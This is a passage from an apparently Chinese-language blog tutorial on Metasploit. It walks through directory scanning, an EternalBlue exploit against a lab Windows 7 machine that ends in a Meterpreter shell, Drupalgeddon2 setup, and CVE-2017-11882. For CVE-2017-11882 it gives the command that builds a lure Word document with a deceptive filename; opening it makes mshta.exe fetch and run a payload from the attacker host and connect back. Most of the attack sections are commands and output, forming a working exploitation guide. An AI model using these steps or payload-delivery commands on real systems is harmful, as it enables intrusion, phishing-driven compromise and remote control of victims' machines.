class="line">..................</span><br><span class="line">...................</span><br><span class="line">..................</span><br><span class="line">补一句还是，hydra好用！！！</span><br></pre></td></tr></table></figure>

<p>还可以利用模块中：dir_scanner来进行网站目录扫描：(还是那句话扫描速度堪忧真专业事还是专业工具来干吧)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/http/dir_scanner) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Detecting error code</span><br><span class="line">[*] Using code &#x27;404&#x27; as not found for 192.168.189.139</span><br><span class="line">[+] Found http://192.168.189.139:80/.../ 403 (192.168.189.139)</span><br><span class="line">[+] Found http://192.168.189.139:80/.CVS/ 403 (192.168.189.139)</span><br><span class="line">[+] Found http://192.168.189.139:80/0/ 200 (192.168.189.139)</span><br><span class="line">[+] Found http://192.168.189.139:80/Admin/ 403 (192.168.189.139)</span><br><span class="line">[+] Found http://192.168.189.139:80/USER/ 200 (192.168.189.139)</span><br><span class="line">[+] Found http://192.168.189.139:80/abc/ 403 (192.168.189.139)</span><br><span class="line">[+] Found http://192.168.189.139:80/admin/ 403 (192.168.189.139)</span><br><span class="line">[+] Found http://192.168.189.139:80/batch/ 403 (192.168.189.139)</span><br><span class="line">[+] Found http://192.168.189.139:80/cgi-bin/ 403 (192.168.189.139)</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line">...........</span><br><span class="line">..........</span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4，主动渗透攻击"><a href="#4，主动渗透攻击" class="headerlink" title="4，主动渗透攻击"></a>4，主动渗透攻击</h2><h3 id="例1：经典永恒之蓝攻击（445端口）"><a href="#例1：经典永恒之蓝攻击（445端口）" class="headerlink" title="例1：经典永恒之蓝攻击（445端口）"></a>例1：经典永恒之蓝攻击（445端口）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17_010</span><br><span class="line"></span><br><span class="line">   0   **exploit/windows/smb/ms17_010_eternalblue**       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   1     \_ target: Automatic Target                  .                .        .      .</span><br><span class="line">   2     \_ target: Windows 7                         .                .        .      .</span><br><span class="line">   3     \_ target: Windows Embedded Standard 7       .                .        .      .</span><br><span class="line">   4     \_ target: Windows Server 2008 R2            .                .        .      .</span><br><span class="line">   5     \_ target: Windows 8                         .                .        .      .</span><br><span class="line">   6     \_ target: Windows 8.1                       .                .        .      .</span><br><span class="line">   7     \_ target: Windows Server 2012               .                .        .      .</span><br><span class="line">   8     \_ target: Windows 10 Pro                    .                .        .      .</span><br><span class="line">   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .</span><br><span class="line">   10  **exploit/windows/smb/ms17_010_psexec**            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class="line">   11    \_ target: Automatic                         .                .        .      .</span><br><span class="line">   12    \_ target: PowerShell                        .                .        .      .</span><br><span class="line">   13    \_ target: Native upload                     .                .        .      .</span><br><span class="line">   14    \_ target: MOF upload                        .                .        .      .</span><br><span class="line">   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .</span><br><span class="line">   16    \_ AKA: ETERNALROMANCE                       .                .        .      .</span><br><span class="line">   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .</span><br><span class="line">   18    \_ AKA: ETERNALBLUE                          .                .        .      .</span><br><span class="line">   19  **auxiliary/admin/smb/ms17_010_command**           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .</span><br><span class="line">   21    \_ AKA: ETERNALROMANCE                       .                .        .      .</span><br><span class="line">   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .</span><br><span class="line">   23    \_ AKA: ETERNALBLUE                          .                .        .      .</span><br><span class="line">   24  **auxiliary/scanner/smb/smb_ms17_010**             .                normal   No     MS17-010 SMB RCE Detection</span><br><span class="line">   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .</span><br><span class="line">   26    \_ AKA: ETERNALBLUE                          .                .        .      .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 26, use 26 or use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>


<p>其中<code>auxiliary/scanner/smb/smb_ms17_010</code>这个用于扫描内网中存在永恒之蓝漏洞的功能块。</p>
<p>我在本地搭建了一个只有win7和kali的局域网虚拟机环境对其进行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.1.1.0/24</span><br><span class="line">rhosts =&gt; 10.1.1.0/24</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 10.1.1.0:445          - Rex::HostUnreachable: The host (10.1.1.0:445) was unreachable.</span><br><span class="line">[-] 10.1.1.1:445          - Rex::HostUnreachable: The host (10.1.1.1:445) was unreachable.</span><br><span class="line">[-] 10.1.1.2:445          - Rex::HostUnreachable: The host (10.1.1.2:445) was unreachable.</span><br><span class="line">[-] 10.1.1.3:445          - Rex::HostUnreachable: The host (10.1.1.3:445) was unreachable.</span><br><span class="line">[+] 10.1.1.4:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[-] 10.1.1.5:445          - Rex::HostUnreachable: The host (10.1.1.5:445) was unreachable.</span><br><span class="line">[-] 10.1.1.6:445          - Rex::HostUnreachable: The host (10.1.1.6:445) was unreachable.</span><br><span class="line">[-] 10.1.1.7:445          - Rex::HostUnreachable: The host (10.1.1.7:445) was unreachable.</span><br><span class="line">[-] 10.1.1.8:445          - Rex::HostUnreachable: The host (10.1.1.8:445) was unreachable.</span><br><span class="line">[-] 10.1.1.9:445          - Rex::HostUnreachable: The host (10.1.1.9:445) was unreachable.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如上<code>+</code>代表成功扫描到了，可能存在永恒之蓝漏洞。</p>
<p>然后直接利用exploit模块下的永恒之蓝攻击工具，对该ip进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.1.1.4</span><br><span class="line">rhosts =&gt; 10.1.1.4</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.1.1.99</span><br><span class="line">lhost =&gt; 10.1.1.99</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.1.1.99:4444 </span><br><span class="line">[*] 10.1.1.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.1.1.4:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.1.1.4:445          - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 10.1.1.4:445 - The target is vulnerable.</span><br><span class="line">[*] 10.1.1.4:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.1.1.4:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.1.1.4:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.1.1.4:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.1.1.4:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.1.1.4:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.1.1.4:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.1.1.4:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.1.1.4:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.1.1.4:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.1.1.4:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.1.1.4:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.1.1.4:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.1.1.4:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.1.1.4:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.1.1.4:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.1.1.4:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.1.1.4:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.1.1.4:445 - Triggering free of corrupted buffer.</span><br><span class="line">[-] 10.1.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[-] 10.1.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[-] 10.1.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[*] 10.1.1.4:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.1.1.4:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.1.1.4:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.1.1.4:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.1.1.4:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.1.1.4:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.1.1.4:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.1.1.4:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.1.1.4:445 - Trying exploit with 17 Groom Allocations.</span><br><span class="line">[*] 10.1.1.4:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.1.1.4:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.1.1.4:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.1.1.4:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.1.1.4:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.1.1.4:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.1.1.4:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.1.1.4:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.1.1.4:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.1.1.4:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201798 bytes) to 10.1.1.4</span><br><span class="line">[*] Meterpreter session 1 opened (10.1.1.99:4444 -&gt; 10.1.1.4:49359) at 2024-07-29 21:02:05 +0800</span><br><span class="line">[+] 10.1.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.1.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.1.1.4:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>出现meterpreter就说明已经攻击成功了！！</strong>从上面的日志可以看出并不是一次就会攻击成功的，他进行了两次攻击尝试，这个和工具里面的工具描述可以说得上是匹配上了！</p>
<p>然后输入<code>shell</code>获得一个类似windows平台下的cmd窗口。**(输入chcp 65001)临时解决乱码问题**</p>
<h3 id="例2：CVE-2018-7600-DC-1-web"><a href="#例2：CVE-2018-7600-DC-1-web" class="headerlink" title="例2：CVE-2018-7600(DC-1,web)"></a>例2：CVE-2018-7600(DC-1,web)</h3><p>首先，<code>search CVE:2018-7600</code>，查询是否有相关的cve攻击脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询结果如下：</span><br><span class="line">msf6 &gt; search CVE:2018-7600</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>

<p>查询到以后直接<code>use 0</code>进入该功能块:然后使用<code>info</code>查看该模块的一些具体信息：</p>
<p>在此不演示直接使用<code>show options</code>来显示需要用到的参数配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  false            no        Dump payload command output</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP function to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...</span><br><span class="line">                                           ]</span><br><span class="line">   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/us</span><br><span class="line">                                           ing-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.189.141  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现需要配置攻击ip：<code>set rhosts 192.168.189.139</code></p>
<p>配置完成后直接进行攻击<code>run</code></p>
<h4 id="评价："><a href="#评价：" class="headerlink" title="评价："></a>评价：</h4><p><strong>个人认为是非常之优雅！！</strong></p>
<h2 id="5，被动渗透攻击"><a href="#5，被动渗透攻击" class="headerlink" title="5，被动渗透攻击"></a>5，被动渗透攻击</h2><h4 id="office-cve-2017-11882："><a href="#office-cve-2017-11882：" class="headerlink" title="office_cve_2017_11882："></a>office_cve_2017_11882：</h4><p>适用office版本范围：2007-2016</p>
<p>利用python脚本：</p>
<p><code>python2 Command_CVE-2017-11882.py -c &quot;calc&quot; -o test.doc</code>会生成一个word文档，一旦这个文档在待攻击靶机上被点击，就会自动执行命令calc，然后弹出计算器。我们可以在这里写一个反弹shell的命令来对其进行远程上线。</p>
<p>如何利用msf来对其进行利用呢，首先将github上clone下来的文件内容中有一个rb脚本，将其移入到exploit&#x2F;icon_tools&#x2F;这个模块下，然后<code>show options</code>对需要的参数进行一个解读如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/icon_tools/office_cve_2017_11882 </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/icon_tools/office_cve_2017_11882):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be</span><br><span class="line">                                       an address on the local machine or 0.0.0.0 to listen on all add</span><br><span class="line">                                       resses.</span><br><span class="line">   SRVPORT  8080             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated</span><br><span class="line">                                       )</span><br><span class="line">   URIPATH                   no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.189.141  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中SRVHOST设置服务端地址，SRVPORT是服务端口号，URIPATH是路径，我们可以对其进行一些设置</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; set srvport 80</span><br><span class="line">srvport =&gt; 80</span><br><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; set uripath /a</span><br><span class="line">uripath =&gt; /a</span><br><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/icon_tools/office_cve_2017_11882):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be</span><br><span class="line">                                       an address on the local machine or 0.0.0.0 to listen on all add</span><br><span class="line">                                       resses.</span><br><span class="line">   SRVPORT  80               yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated</span><br><span class="line">                                       )</span><br><span class="line">   URIPATH  /a               no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.189.141  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.189.141:4444 </span><br><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; [*] Using URL: http://192.168.189.141/a</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Place the following DDE in an MS document:</span><br><span class="line">mshta.exe &quot;http://192.168.189.141/a&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们开启了一个服务，这个服务上有一个hta文件，利用mshta解释器执行这个文件。</span><br></pre></td></tr></table></figure>

<p>这个是windows上的命令执行：mshta.exe “<a target="_blank" rel="noopener" href="http://192.168.189.141/a%22%EF%BC%8C%E7%9B%B8%E5%BD%93%E4%BA%8E%E8%AE%A9%E5%85%B6%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%EF%BC%9A">http://192.168.189.141/a&quot;，相当于让其远程下载一个文件并执行：</a></p>
<p>接下来我们利用python脚本对其进行恶意word文档生成：</p>
<p><code>python2 Command_CVE-2017-11882.py -c &quot;mshta.exe &quot;http://192.168.189.141/a&quot;&quot; -o 如何给女朋友过好八十大寿.doc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿zss)-[/home/zss/CVEtools/CVE-2017-11882/CVE-2017-11882]</span><br><span class="line">└─# python2 Command_CVE-2017-11882.py -c &quot;mshta.exe &quot;http://192.168.189.141/a&quot;&quot; -o 如何给女朋友过好八十大寿.doc</span><br><span class="line">[*] Done ! output file &gt;&gt; 如何给女朋友过好八十大寿.doc &lt;&lt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功生成了该doc攻击文件，上传到其服务器上，当对方点击该文件时，将会，执行命令<code>mshta.exe &quot;http://192.168.189.141/a</code>，下载并执行a.hta文件，然后我方就成功上线了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">对方一旦点击我们的恶意文件就会自动在kali上线：</span><br><span class="line"></span><br><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; </span><br><span class="line">[*] 192.168.189.250  office_cve_2017_11882 - Delivering payload</span><br><span class="line">[*] Sending stage (176198 bytes) to 192.168.189.250</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.189.141:4444 -&gt; 192.168.189.250:49479) at 2024-07-30 10:51:41 +0800</span><br><span class="line">dir</span><br><span class="line">[*] exec: dir</span><br><span class="line"></span><br><span class="line">office_cve_2017_11882.rb</span><br><span class="line">msf6 exploit(icon_tools/office_cve_2017_11882) &gt; sessions -i</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span 